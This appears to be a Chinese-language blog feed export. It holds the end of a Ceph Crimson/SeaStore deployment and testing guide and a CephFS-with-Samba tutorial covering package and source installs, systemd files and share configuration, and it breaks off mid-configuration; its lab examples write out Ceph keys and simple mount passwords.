对象的元数据的默认逻辑地址空间保留，默认值为 16777216 ；</li><li><code>seastore_full_integrity_check</code> : seastore 是否需要完全检查每个范围的完整性，非完全完整性检查意味着在范围重映射期间可能会跳过完整性检查以提高性能，禁用时需谨慎，默认值为 false ；</li><li><code>seastore_max_data_allocation_size</code> : 范围可以达到的最大字节大小， 一旦子范围读取&#x2F;校验和实现，seastore_max_data_allocation_size 应该被弃用。默认值为 32K ；</li><li><code>seastore_cache_lru_size</code> : 要保留在缓存中的扩展大小（以字节为单位），默认值为 64M ；</li><li><code>seastore_obj_data_write_amplification</code> : 如果写入大小的总扩展大小超过这个值，则分割扩展，默认值为 1.25 ；</li><li><code>seastore_max_concurrent_transactions</code> : seastore 允许的最大并发事务，默认值为 8 ；</li><li><code>seastore_main_device_type</code> : seastore 使用的主设备类型，可选值为 SSD&#x2F;RANDOM_BLOCK_SSD ,默认值为 SSD 。还有当前不支持的 HDD&#x2F;ZBD 配置，其中 ZBD 指的是 ZNS SSD 或者 SMR HDD ；</li><li><code>seastore_cbjournal_size</code> : 创建时用于 CircularBoundedJournal 的总大小，只有在 seastore_main_device_type 是 RANDOM_BLOCK 时有效， 默认值为 5G ；</li><li><code>seastore_multiple_tiers_stop_evict_ratio</code> : 当主层使用的比率小于这个值时，停止将冷数据驱除到冷层，默认值为 0.5 ；</li><li><code>seastore_multiple_tiers_default_evict_ratio</code> : 在使用主层使用比率达到这个值时，开始将冷数据驱除到冷层，默认值为 0.6 ；</li><li><code>seastore_multiple_tiers_fast_evict_ratio</code> : 当主层使用比率达到这个值时，立即开始驱除，默认值为 0.7 ；</li><li><code>seastore_data_delta_based_overwrite</code> : 如果覆盖大小小于或等于该值，则基于增量覆盖现有数据块，否则基于重映射进行覆盖，设置为 0 强制使用基于重映射的覆盖。默认值为 0 ；</li><li><code>seastore_disable_end_to_end_data_protection</code> : 当为 false 时，在 mkfs 时尝试发现 nvme 设备是否支持内部校验和功能而不使用服务器 CPU，然后在可用时启用，设置为 true 则无条件禁用。默认值为 true ；</li></ul><h3 id="2-3-2、添加主机到集群"><a href="#2-3-2、添加主机到集群" class="headerlink" title="2.3.2、添加主机到集群"></a>2.3.2、添加主机到集群</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加主机到集群</span><br>ceph orch host add ceph02 10.10.10.2<br>ceph orch host add ceph03 10.10.10.3<br></code></pre></td></tr></table></figure><h3 id="2-3-3、添加-OSD-存储"><a href="#2-3-3、添加-OSD-存储" class="headerlink" title="2.3.3、添加 OSD 存储"></a>2.3.3、添加 OSD 存储</h3><blockquote><p><strong>注意:</strong> <a href="https://github.com/ceph/ceph/pull/64323">pull&#x2F;64323</a> 中支持了通过 cephadm 部署 seastore 类型的 osd ，详细操作方式如下。</p></blockquote><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加 OSD 存储</span><br>ceph orch device <span class="hljs-built_in">ls</span><br>ceph orch daemon add osd ceph01:data_devices=/dev/sdd,/dev/sde,objectstore=seastore<br>ceph orch daemon add osd ceph02:data_devices=/dev/sdd,/dev/sde,objectstore=seastore<br>ceph orch daemon add osd ceph03:data_devices=/dev/sdd,/dev/sde,objectstore=seastore<br><br><span class="hljs-comment"># 查看 OSD 的存储类型</span><br>ceph tell ceph.* config get osd_objectstore<br></code></pre></td></tr></table></figure><h2 id="2-4、集群测试"><a href="#2-4、集群测试" class="headerlink" title="2.4、集群测试"></a>2.4、集群测试</h2><h3 id="2-4-1、测试-RBD-功能"><a href="#2-4-1、测试-RBD-功能" class="headerlink" title="2.4.1、测试 RBD 功能"></a>2.4.1、测试 RBD 功能</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 rbd pool</span><br>ceph osd pool create rbdpool 64 64<br>ceph osd pool application <span class="hljs-built_in">enable</span> rbdpool rbd<br>ceph osd pool <span class="hljs-built_in">set</span> rbdpool pg_autoscale_mode off<br><br><span class="hljs-comment"># 创建 rbd image</span><br>rbd create -p rbdpool --image rbdimg01 --size 10G<br><br><span class="hljs-comment"># 删除 rbd image</span><br>rbd <span class="hljs-built_in">rm</span> --pool rbdpool --image rbdimg01<br><br><span class="hljs-comment"># 查看 rbd image 信息</span><br>rbd info rbdpool/rbdimg01<br><br><span class="hljs-comment"># krbd 方式映射 rbd image (默认方式)</span><br><span class="hljs-comment"># 由于 crimson osd 仅支持 message v2, 因此我们需要切换为 message v2进行连接通信</span><br><span class="hljs-comment"># 详细支持的参数列表: https://github.com/ceph/ceph/blob/v19.2.1/src/tools/rbd/action/Kernel.cc#L120</span><br>rbd device map -t krbd rbdpool/rbdimg01 -o mount_timeout=5,ms_mode=crc<br><br><span class="hljs-comment"># nbd 方式映射 rbd image</span><br><span class="hljs-comment"># 由于 crimson osd 仅支持 message v2, 因此我们需要切换为 message v2进行连接通信</span><br><span class="hljs-comment"># 详细支持的参数列表: https://github.com/ceph/ceph/blob/v19.2.1/src/tools/rbd_nbd/rbd-nbd.cc#L2118</span><br>rbd device map -t nbd rbdpool/rbdimg01<br><br><span class="hljs-comment"># 格式化 krbd 方式映射的 rbd image 并挂载</span><br>mkfs.xfs /dev/rbd0<br><span class="hljs-built_in">mkdir</span> -p /mnt/cephrbd<br>mount /dev/rbd0 /mnt/cephrbd<br><br><span class="hljs-comment"># 格式化 nbd 方式映射的 rbd image 并挂载</span><br>mkfs.xfs /dev/nbd1<br><span class="hljs-built_in">mkdir</span> -p /mnt/cephrbd<br>mount /dev/nbd1 /mnt/cephrbd<br><br><span class="hljs-comment"># 压测 rbd image - 限速写</span><br><span class="hljs-built_in">cd</span> /mnt/cephrbd<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=testfile status=progress<br><br><span class="hljs-comment"># 压测 rbd image - 限速读</span><br><span class="hljs-built_in">cd</span> /mnt/cephrbd<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><br><span class="hljs-comment"># 在线调整 rbd image 格式化后的文件系统的大小</span><br>xfs_growfs -d /mnt/cephrbd-01<br><br><span class="hljs-comment"># 查看 rbd map devices</span><br>rbd device list -t krbd<br>rbd device list -t nbd<br><br><span class="hljs-comment"># 取消挂载 rbd image</span><br>umount /mnt/cephrbd<br>rbd device unmap rbdpool/rbdimg01 -t krbd<br>rbd device unmap rbdpool/rbdimg01 -t nbd<br></code></pre></td></tr></table></figure><h3 id="2-4-2、测试-FS-功能"><a href="#2-4-2、测试-FS-功能" class="headerlink" title="2.4.2、测试 FS 功能"></a>2.4.2、测试 FS 功能</h3><p>添加 MDS 组件并创建文件系统:  详见 <a href="https://docs.ceph.com/en/latest/cephadm/services/mds/#orchestrator-cli-cephfs">Deploy CephFS</a> ；</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 添加 MDS 组件并创建文件系统</span><br>ceph fs volume create cephfs<br><br><span class="hljs-comment"># kernel 方式挂载 cephfs</span><br><span class="hljs-comment"># 详细支持的参数列表: https://github.com/ceph/ceph/blob/v19.2.1/src/mount/mount.ceph.c#L473</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/kernel-cephfs<br>mount -t ceph 10.10.10.1:3300:/ /mnt/kernel-cephfs -o name=admin,secret=AQBVokZoak+LJRAAqgeJr6j77v729bfvBl/Z3g==,ms_mode=crc,mount_timeout=5<br><br><span class="hljs-comment"># fuse 方式挂载 cephfs</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/fuse-cephfs<br>ceph-fuse -c /etc/ceph/ceph.conf -n client.admin -m 10.10.10.1:3300 /mnt/fuse-cephfs --client_mountpoint /<br><br><span class="hljs-comment"># 测试读写 - 限速写</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/kernel-cephfs/testfile status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero bs=1M count=1000 | pv -L 3M | <span class="hljs-built_in">dd</span> of=/mnt/fuse-cephfs/testfile status=progress<br><br><span class="hljs-comment"># 测试读写 - 限速读</span><br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/kernel-cephfs/testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/mnt/fuse-cephfs/testfile bs=1M count=1000 iflag=direct | pv -L 1M | <span class="hljs-built_in">dd</span> of=/dev/null status=progress<br><br><span class="hljs-comment"># 取消挂载 kernel 方式的 cephfs</span><br>umount /mnt/kernel-cephfs<br><br><span class="hljs-comment"># 取消挂载 fuse 方式的 cephfs</span><br>fusermount -u /mnt/fuse-cephfs<br></code></pre></td></tr></table></figure><h1 id="三、相关资料"><a href="#三、相关资料" class="headerlink" title="三、相关资料"></a>三、相关资料</h1><ul><li><a href="https://ceph.io/en/news/blog/2025/crimson-T-release/">https://ceph.io/en/news/blog/2025/crimson-T-release/</a></li><li><a href="https://docs.ceph.com/en/latest/dev/quick_guide">https://docs.ceph.com/en/latest/dev/quick_guide</a></li><li><a href="https://docs.ceph.com/en/latest/dev/crimson/crimson">https://docs.ceph.com/en/latest/dev/crimson/crimson</a></li><li><a href="https://docs.ceph.com/en/latest/cephadm/install/#bootstrap-a-new-cluster">https://docs.ceph.com/en/latest/cephadm/install/#bootstrap-a-new-cluster</a></li><li><a href="https://www.51cto.com/article/749735.html">https://www.51cto.com/article/749735.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/667949613">https://zhuanlan.zhihu.com/p/667949613</a></li><li><a href="https://docs.redhat.com/zh-cn/documentation/red_hat_ceph_storage/7/html/administration_guide/crimson">https://docs.redhat.com/zh-cn/documentation/red_hat_ceph_storage/7/html/administration_guide/crimson</a></li><li><a href="https://ceph.io/en/news/blog/2023/crimson-multi-core-scalability">https://ceph.io/en/news/blog/2023/crimson-multi-core-scalability</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CephFS 对接 Samba 使用教程</title>
      <link href="/2024/12/01/cephfs-samba/"/>
      <url>/2024/12/01/cephfs-samba/</url>
      
        <content type="html"><![CDATA[<h1 id="一、Samba-介绍"><a href="#一、Samba-介绍" class="headerlink" title="一、Samba 介绍"></a>一、Samba 介绍</h1><p>Samba 是一款基于 GNU 通用公共许可证的自由软件，Samba 项目是软件自由保护协会 (Software Freedom Conservancy) 的成员。自 1992 年以来，Samba 一直为所有使用 SMB&#x2F;CIFS 协议的客户端（例如所有版本的 DOS 和 Windows、OS&#x2F;2、Linux 以及许多其他系统）提供安全、稳定且快速的文件和打印服务。</p><p>Samba 项目源码位于 <a href="https://git.samba.org/samba.git">https://git.samba.org/samba.git</a> , 镜像代码仓库地址为 <a href="https://github.com/samba-team/samba">https://github.com/samba-team/samba</a> 。</p><h2 id="1-1、二进制包安装部署"><a href="#1-1、二进制包安装部署" class="headerlink" title="1.1、二进制包安装部署"></a>1.1、二进制包安装部署</h2><p>我们的机器环境为 <code>CentOS 8.5.2111</code> ， 受限于系统版本较老，导致最终安装版本为 <a href="https://github.com/samba-team/samba/tree/samba-4.19.4">Samba 4.19.4</a> 。以下操作基于这些环境进行。</p><p>由于安装的 Samba 软件默认缺少 vfs_ceph 的相关库，所以在测试的时候无法测试一些使用场景，因此在实际部署测试的时候并不会使用该版本进行测试，而是会采用编译安装的版本进行测试。</p><h3 id="1-1-1、环境初始化"><a href="#1-1-1、环境初始化" class="headerlink" title="1.1.1、环境初始化"></a>1.1.1、环境初始化</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装软件</span><br>dnf install -y samba samba-client samba-common<br></code></pre></td></tr></table></figure><h3 id="1-1-2、运行环境配置"><a href="#1-1-2、运行环境配置" class="headerlink" title="1.1.2、运行环境配置"></a>1.1.2、运行环境配置</h3><p>详细配置信息可以查看 &#x2F;etc&#x2F;samba&#x2F;smb.conf.example 文件, 或者使用 man smb.conf 命令。</p><p><strong>&#x2F;etc&#x2F;samba&#x2F;smb.conf 配置内容:</strong> (配置模板为: <a href="https://github.com/samba-team/samba/blob/samba-4.19.4/examples/smb.conf.default">examples&#x2F;smb.conf.default</a>)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[global]<br>    workgroup = SAMBA<br>    security = user<br>    passdb backend = tdbsam<br>    printing = cups<br>    printcap name = cups<br>    load printers = yes<br>    cups options = raw<br>    # Install samba-usershares package for support<br>    include = /etc/samba/usershares.conf<br><br>[homes]<br>    comment = Home Directories<br>    valid users = %S, %D%w%S<br>    browseable = No<br>    read only = No<br>    inherit acls = Yes<br><br>[printers]<br>    comment = All Printers<br>    path = /var/tmp<br>    printable = Yes<br>    create mask = 0600<br>    browseable = No<br><br>[print$]<br>    comment = Printer Drivers<br>    path = /var/lib/samba/drivers<br>    write list = @printadmin root<br>    force group = @printadmin<br>    create mask = 0664<br>    directory mask = 0775<br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>golbal</code>: 全局配置<ul><li><code>workgroup</code> ：设置工作组名称为 SAMBA 。</li><li><code>security</code> ：采用用户级别的安全性，即用户需要提供用户名和密码才能访问共享。</li><li><code>passdb backend</code> ：用户信息存储方式为 TDBSAM（Trivial Database SAM） ，这是一种本地数据库形式用于存储用户信息。</li><li><code>printing</code> ：使用 cups 作为打印系统。</li><li><code>printcap name</code> ：指定打印功能配置文件的名称为 cups 。</li><li><code>load printers</code> ：自动加载打印机。</li><li><code>cups options</code> ：设置 cups 的选项为 raw ，即原生打印，不进行格式转换。</li><li><code>include</code> ：包含额外的配置文件，通常用于用户自定义的共享设置。</li></ul></li><li><code>homes</code> : 用户主目录<ul><li><code>comment</code> ：共享的描述。</li><li><code>valid users</code> ：设定哪些用户可以访问此共享。 %S 是当前用户， %D%w%S 用于 Windows NT 域的设置。</li><li><code>browseable</code> ：此共享是否在网络邻居中显示。</li><li><code>read only</code> ：指定共享为可读写。</li><li><code>inherit acls</code> ：共享将继承访问控制列表（ACLs），这决定了文件或目录的权限。</li></ul></li><li><code>printers</code> : 打印机共享<ul><li><code>comment</code> ：共享的描述。</li><li><code>path</code> ：设置临时文件存放的路径。</li><li><code>printable</code> ：指定这是一个可打印的共享。</li><li><code>create mask</code> ：新创建文件的权限。</li><li><code>browseable</code> ：此共享是否在网络邻居中显示。</li></ul></li><li><code>print</code> : 打印机驱动共享<ul><li><code>comment</code> ：共享的描述。</li><li><code>path</code> ：打印机驱动程序的存放路径。</li><li><code>write list</code> ：定义哪些用户或用户组可以写入此共享，这里是 printadmin 组和 root 用户。</li><li><code>force group</code> ：所有创建的文件都将属于 printadmin 组。</li><li><code>create mask</code> ：设置文件和目录的默认权限。</li></ul></li></ul><h3 id="1-1-3、启动服务"><a href="#1-1-3、启动服务" class="headerlink" title="1.1.3、启动服务"></a>1.1.3、启动服务</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户组</span><br><span class="hljs-built_in">sudo</span> groupadd samba<br><br><span class="hljs-comment"># 创建用户</span><br><span class="hljs-built_in">sudo</span> useradd user1 -d /home/user1 -g samba -s /sbin/nologin<br><span class="hljs-built_in">sudo</span> useradd user2 -d /home/user2 -g samba -s /sbin/nologin<br><br><span class="hljs-comment"># 设置连接密码</span><br>smbpasswd -a user1<br>smbpasswd -a user2<br><br><span class="hljs-comment"># 启动服务</span><br>systemctl restart smb.service<br><br><span class="hljs-comment"># 查看服务状态</span><br>systemctl status smb.service<br><br><span class="hljs-comment"># 启用服务开机启动</span><br>systemctl <span class="hljs-built_in">enable</span> smb.service<br><br><span class="hljs-comment"># 关闭服务开机启动</span><br>systemctl <span class="hljs-built_in">disable</span> smb.service<br></code></pre></td></tr></table></figure><h2 id="1-2、编译安装部署"><a href="#1-2、编译安装部署" class="headerlink" title="1.2、编译安装部署"></a>1.2、编译安装部署</h2><p>编译安装时，我们的机器环境为 CentOS 8.5.2111 , 使用 <a href="https://github.com/samba-team/samba/tree/samba-4.22.3">Samba 4.22.3</a> 版本编译安装。</p><h3 id="1-2-1、编译安装"><a href="#1-2-1、编译安装" class="headerlink" title="1.2.1、编译安装"></a>1.2.1、编译安装</h3><blockquote><p>注意: 如果不修改 .&#x2F;configure 的配置参数，则 Samba 的默认安装位置为 &#x2F;usr&#x2F;local&#x2F;samba&#x2F; 。</p></blockquote><p><strong>相关命令:</strong> (参考文档: <a href="https://wiki.samba.org/index.php/Build_Samba_from_Source">https://wiki.samba.org/index.php/Build_Samba_from_Source</a>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装基础软件</span><br>dnf groupinstall -y <span class="hljs-string">&quot;Development Tools&quot;</span><br>dnf install -y gnutls-devel openldap openldap-devel lmdb lmdb-devel gpgme-devel python3-gpg \<br>               readline-devel cpanminus jansson-devel libarchive-devel pam-devel dbus-devel \<br>               python3-markdown python3-dns popt-devel libcephfs-devel<br>cpanm Parse::Yapp<br>perl -MParse::Yapp::Driver -e <span class="hljs-string">&#x27;print &quot;Parse::Yapp::Driver is installed\n&quot;&#x27;</span><br><br><span class="hljs-comment"># 开始编译</span><br>git <span class="hljs-built_in">clone</span> https://git.samba.org/samba.git<br><span class="hljs-built_in">cd</span> samba/<br>git checkout -f samba-4.22.3<br>git branch<br>./configure --enable-cephfs<br>make<br>make install<br></code></pre></td></tr></table></figure><p><strong>相关操作日志:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">[root@host03 samba]# ./configure --enable-cephfs<br>...<br>Checking <span class="hljs-keyword">if</span> compiler accepts -fstack-clash-protection                                           : <span class="hljs-built_in">yes</span><br><span class="hljs-string">&#x27;configure&#x27;</span> finished successfully (55.441s)<br><br><br>[root@host03 samba]# make<br>...<br>Waf: Leaving directory <span class="hljs-string">&#x27;/data/tools/samba/bin/default&#x27;</span><br>Build commands will be stored <span class="hljs-keyword">in</span> bin/default/compile_commands.json<br><span class="hljs-string">&#x27;build&#x27;</span> finished successfully (9m37.114s)<br><br><br>[root@host03 samba]# make install<br>...<br>+ install /usr/local/samba/share/man/man1/locktest.1 (from bin/default/source4/torture/man/locktest.1)<br>+ install /usr/local/samba/share/man/man8/samba-gpupdate.8 (from bin/default/source4/scripting/man/samba-gpupdate.8)<br>Waf: Leaving directory <span class="hljs-string">&#x27;/data/tools/samba/bin/default&#x27;</span><br><span class="hljs-string">&#x27;install&#x27;</span> finished successfully (3m49.942s)<br></code></pre></td></tr></table></figure><h3 id="1-2-2、环境环境配置"><a href="#1-2-2、环境环境配置" class="headerlink" title="1.2.2、环境环境配置"></a>1.2.2、环境环境配置</h3><p><strong>配置文件 &#x2F;usr&#x2F;local&#x2F;samba&#x2F;etc&#x2F;smb.conf 内容:</strong> （文件模板为: <a href="https://github.com/samba-team/samba/blob/samba-4.22.3/examples/smb.conf.default">examples&#x2F;smb.conf.default</a>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[global]<br>    workgroup = SAMBA<br>    security = user<br>    log file = /usr/local/samba/var/log.%m<br>    passdb backend = tdbsam<br>    # Install samba-usershares package for support<br>    include = /usr/local/samba/etc/usershares.conf<br><br>[homes]<br>    comment = Home Directories<br>    valid users = %S, %D%w%S<br>    browseable = No<br>    read only = No<br>    inherit acls = Yes<br></code></pre></td></tr></table></figure><p><strong>配置文件 &#x2F;etc&#x2F;sysconfig&#x2F;samba 内容:</strong> （文件模板为: <a href="https://github.com/samba-team/samba/blob/samba-4.22.3/packaging/systemd/samba.sysconfig">packaging&#x2F;systemd&#x2F;samba.sysconfig</a>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">## Path:           Network/Samba<br>## Description:    Samba process options<br>## Type:           string<br>## Default:        &quot;&quot;<br>## ServiceRestart: samba<br>SAMBAOPTIONS=&quot;&quot;<br>## Type:           string<br>## Default:        &quot;&quot;<br>## ServiceRestart: smb<br>SMBDOPTIONS=&quot;&quot;<br>## Type:           string<br>## Default:        &quot;&quot;<br>## ServiceRestart: nmb<br>NMBDOPTIONS=&quot;&quot;<br>## Type:           string<br>## Default:        &quot;&quot;<br>## ServiceRestart: winbind<br>WINBINDOPTIONS=&quot;&quot;<br></code></pre></td></tr></table></figure><p>按照官方文档所描述的，编译安装的 Samba 并没有 systemd 服务文件，为了使用 systemctl 工具，我们需要手动创建 systemd 文件。</p><p><strong>配置文件 &#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;smb.service 内容:</strong> （文件模板为: <a href="https://github.com/samba-team/samba/blob/samba-4.22.3/packaging/systemd/smb.service.in">packaging&#x2F;systemd&#x2F;smb.service.in</a>）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[Unit]<br>Description=Samba SMB Daemon<br>Documentation=man:smbd(8) man:samba(7) man:smb.conf(5)<br>Wants=network-online.target<br>After=network.target network-online.target nmb.service winbind.service<br><br>[Service]<br>Type=notify<br>PIDFile=/run/smbd.pid<br>LimitNOFILE=16384<br>EnvironmentFile=-/etc/sysconfig/samba<br>ExecStart=/usr/local/samba/sbin/smbd --foreground --no-process-group $SMBDOPTIONS<br>ExecReload=/bin/kill -HUP $MAINPID<br>LimitCORE=infinity<br>Environment=KRB5CCNAME=FILE:/run/samba/krb5cc_samba<br><br>[Install]<br>WantedBy=multi-user.target<br></code></pre></td></tr></table></figure><h3 id="1-2-3、启动服务"><a href="#1-2-3、启动服务" class="headerlink" title="1.2.3、启动服务"></a>1.2.3、启动服务</h3><p>日志文件位于: &#x2F;usr&#x2F;local&#x2F;samba&#x2F;var&#x2F;log.smbd</p><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建用户组</span><br><span class="hljs-built_in">sudo</span> groupadd samba<br><br><span class="hljs-comment"># 创建用户</span><br><span class="hljs-built_in">sudo</span> useradd user1 -d /home/user1 -g samba -s /sbin/nologin<br><span class="hljs-built_in">sudo</span> useradd user2 -d /home/user2 -g samba -s /sbin/nologin<br><br><span class="hljs-comment"># 设置连接密码</span><br>/usr/local/samba/bin/smbpasswd -a user1<br>/usr/local/samba/bin/smbpasswd -a user2<br><br><span class="hljs-comment"># 重新加载 systemd 配置</span><br>systemctl daemon-reload<br><br><span class="hljs-comment"># 启动服务</span><br>systemctl restart smb.service<br><br><span class="hljs-comment"># 查看服务状态</span><br>systemctl status smb.service<br><br><span class="hljs-comment"># 启用服务开机启动</span><br>systemctl <span class="hljs-built_in">enable</span> smb.service<br><br><span class="hljs-comment"># 关闭服务开机启动</span><br>systemctl <span class="hljs-built_in">disable</span> smb.service<br></code></pre></td></tr></table></figure><h2 id="1-3、客户端使用"><a href="#1-3、客户端使用" class="headerlink" title="1.3、客户端使用"></a>1.3、客户端使用</h2><h3 id="1-3-1、Windows-客户端使用"><a href="#1-3-1、Windows-客户端使用" class="headerlink" title="1.3.1、Windows 客户端使用"></a>1.3.1、Windows 客户端使用</h3><p><strong>操作步骤:</strong></p><ol><li>打开 <code>我的电脑</code> ;</li><li>在地址栏输入 <code>\\10.10.10.1</code> 后按下 <code>回车</code> ；</li><li>按照提示输入之前添加的用户 <code>user1</code> 或者 <code>user2</code> 并输出对应的密码即可访问存储；</li></ol><h3 id="1-3-2、Linux-客户端使用"><a href="#1-3-2、Linux-客户端使用" class="headerlink" title="1.3.2、Linux 客户端使用"></a>1.3.2、Linux 客户端使用</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装软件依赖包</span><br>dnf install -y cifs-utils<br><br><span class="hljs-comment"># 执行挂载操作</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/samba/cephfs /mnt/samba/user1<br>mount -t cifs //10.10.10.3/cephfssamba /mnt/samba/cephfs -o username=user1,password=user1<br>mount -t cifs //10.10.10.3/user1 /mnt/samba/user1 -o username=user1,password=user1<br><br><span class="hljs-comment"># 配置开机自动挂载</span><br>vi /etc/fstab<br>//10.10.10.3/cephfssamba /mnt/samba/cephfs cifs user,nofail,username=user1,password=user1 0 0<br>//10.10.10.3/user1 /mnt/samba/user1 cifs user,nofail,username=user1,password=user1 0 0<br><br><span class="hljs-comment"># 取消挂载</span><br>umount /mnt/samba/cephfs<br>umount /mnt/samba/user1<br></code></pre></td></tr></table></figure><h1 id="二、Samba-对接-CephFS"><a href="#二、Samba-对接-CephFS" class="headerlink" title="二、Samba 对接 CephFS"></a>二、Samba 对接 CephFS</h1><p>以下在使用 Samba 访问 CephFS 的时候，基于上面编译安装的 <a href="https://github.com/samba-team/samba/tree/samba-4.22.3">Samba 4.22.3</a> 版本进行。</p><h2 id="2-1、通过共享本机目录访问"><a href="#2-1、通过共享本机目录访问" class="headerlink" title="2.1、通过共享本机目录访问"></a>2.1、通过共享本机目录访问</h2><h3 id="2-1-1、挂载-CephFS"><a href="#2-1-1、挂载-CephFS" class="headerlink" title="2.1.1、挂载 CephFS"></a>2.1.1、挂载 CephFS</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 挂载 cephfs</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs<br>mount -t ceph 10.10.10.1:6789,10.10.10.2:6789,10.10.10.3:6789:/ /mnt/cephfs -o name=admin,secret=AQAK8pFoqGurARAA2WXBLGUcUSqGDAmgqE+v1Q==<br><span class="hljs-built_in">df</span> -h<br><span class="hljs-built_in">ls</span> -al /mnt/cephfs<br><br><span class="hljs-comment"># 创建可访问的目录</span><br><span class="hljs-built_in">mkdir</span> -p /mnt/cephfs/samba<br><span class="hljs-built_in">chmod</span> -R 777 /mnt/cephfs/samba<br></code></pre></td></tr></table></figure><h3 id="2-1-2、配置并启动-Samba"><a href="#2-1-2、配置并启动-Samba" class="headerlink" title="2.1.2、配置并启动 Samba"></a>2.1.2、配置并启动 Samba</h3><p><strong>配置文件 &#x2F;usr&#x2F;local&#x2F;samba&#x2F;etc&#x2F;usershares.conf 内容如下:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[cephfssamba1]<br>    comment = cephfs smaba<br>    path = /mnt/cephfs/samba<br>    public = yes<br>    writable = no<br>    browseable = yes<br>    printable = no<br>    write list = @samba<br></code></pre></td></tr></table></figure><p><strong>配置解析:</strong></p><ul><li><code>cephfssamba1</code> : 导出的目录名；<ul><li>共享 &#x2F;mnt&#x2F;cephfs&#x2F;samba 目录；</li><li>只有 samba 用户组的用户拥有写权限；</li></ul></li></ul><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 重启服务</span><br>systemctl restart smb.service<br><br><span class="hljs-comment"># 查看服务状态</span><br>systemctl status smb.service<br>systemctl <span class="hljs-built_in">enable</span> smb.service<br></code></pre></td></tr></table></figure><h2 id="2-2、通过-vfs-ceph-模块访问"><a href="#2-2、通过-vfs-ceph-模块访问" class="headerlink" title="2.2、通过 vfs_ceph 模块访问"></a>2.2、通过 vfs_ceph 模块访问</h2><p>相关资料： <a href="https://www.samba.org/samba/docs/4.22/man-html/vfs_ceph.8.html">https://www.samba.org/samba/docs/4.22/man-html/vfs_ceph.8.html</a></p><h3 id="2-2-1、CephFS-环境初始化"><a href="#2-2-1、CephFS-环境初始化" class="headerlink" title="2.2.1、CephFS 环境初始化"></a>2.2.1、CephFS 环境初始化</h3><p><strong>相关命令:</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 samba 访问用户</span><br>ceph auth get-or-create client.samba.gw \<br>                        mon <span class="hljs-string">&#x27;allow r fsname=cephfs&#x27;</span> \<br>                        osd <span class="hljs-string">&#x27;allow rw tag cephfs data=cephfs&#x27;</span> \<br>                        mds <span class="hljs-string">&#x27;allow rw fsname=cephfs&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="2-2-2、配置并启动-Samba"><a href="#2-2-2、配置并启动-Samba" class="headerlink" title="2.2.2、配置并启动 Samba"></a>2.2.2、配置并启动 Samba</h3><p><strong>编辑 ceph 密钥文件 &#x2F;etc&#x2F;ceph&#x2F;ceph.client.samba.gw.keyring:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[client.samba.gw]<br>    key = AQDcIJNokOQiChAANblEAglR+OydKxpqu5P3vQ==<br>    caps mds = &quot;allow rw fsname=cephfs&quot;<br>    caps mon = &quot;allow r fsname=cephfs&quot;<br>    caps osd = &quot;allow rw tag cephfs data=cephfs&quot;<br></code></pre></td></tr></table></figure><p><strong>编辑 samba 配置文件 &#x2F;usr&#x2F;local&#x2F;samba&#x2F;etc&#x2F;usershares.conf:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs conf">[cephfssamba1]<br>    comment = cephfs smaba<br>    path = /mnt/cephfs/samba<br>    public = yes<br>    writable = no<br>    browseable = yes<br>    printable = no<br>    write list = @samba<br><br>[cephfssamba2]<br>    vfs objects = ceph<br>    path = /<br>    